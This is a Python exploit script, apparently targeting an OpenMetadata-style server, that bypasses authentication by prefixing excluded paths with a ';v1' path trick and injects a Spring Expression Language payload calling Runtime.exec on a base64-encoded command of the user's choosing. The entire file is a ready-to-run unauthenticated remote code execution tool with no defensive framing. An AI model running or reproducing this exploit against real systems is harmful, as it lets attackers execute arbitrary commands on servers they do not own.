import argparse
import requests
import re
import base64
import urllib.parse

def validate_target(url):
    try:
        pattern = re.compile(r'^https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/.*)?$')
        if not pattern.match(url):
            raise ValueError("Invalid URL format")
        return re.match(r'^https?://[a-zA-Z0-9.-]+(:[0-9]+)?', url).group(0)
    except ValueError as e:
        print("Invalid URL format.")
        exit(1)

def main():
    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('--target', type=str, required=True, help='Target URL')
    parser.add_argument('--cmd', type=str, required=True, help='Command to execute')
    args = parser.parse_args()

    target = validate_target(args.target)
    cmd = args.cmd

    # Step 1: Initial availability check
    check_url = f'{target}/api/v1/events/subscriptions/validation/condition/1234'
    
    try:
        response = requests.get(check_url)
        if response.status_code == 401 and response.json().get('message') == 'Not Authorized! Token not present':
            print("[+] Initial availability check successful.")
        else:
            print("[-] Initial availability check unsuccessful.")
            if response.status_code == 400:
                exit(1)
    except requests.exceptions.ConnectionError as e:
        print("[-] Can't connect to host. Exiting...")
        exit(1)


    # Step 2: Exploitation
    base64_encoded_cmd = base64.b64encode(cmd.encode()).decode()
    
    print(f"[+] Using this command: {cmd}")

    payload = f'T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("{base64_encoded_cmd}")))'
    print(f"[+] Using this payload: {payload}")
    
    encoded_payload = urllib.parse.quote(payload, safe='')

    excluded_paths = [
        '/v1/users/login',
        '/v1/users/signup',
        '/v1/users/registrationConfirmation',
        '/v1/users/resendRegistrationToken',
        '/v1/users/generatePasswordResetLink',
        '/v1/users/password/reset',
        '/v1/users/checkEmailInUse',
        '/v1/users/refresh',
        '/v1/system/config',
        '/v1/system/version'
    ]

    for path in excluded_paths:
        exploit_url = f'{target}/api/v1;v1{urllib.parse.quote(path, safe="")}/events/subscriptions/validation/condition/{encoded_payload}'
        print(f"[+] Constructed URL: {exploit_url}")
        response = requests.get(exploit_url)
        if response.status_code != 401 and 'Not Authorized! Token not present' not in response.json().get('message'):
            print("[+] Command seems to be successfully executed.")
            exit(0)

    print("[-] Can't exploit. Exiting...")


if __name__ == '__main__':
    main()
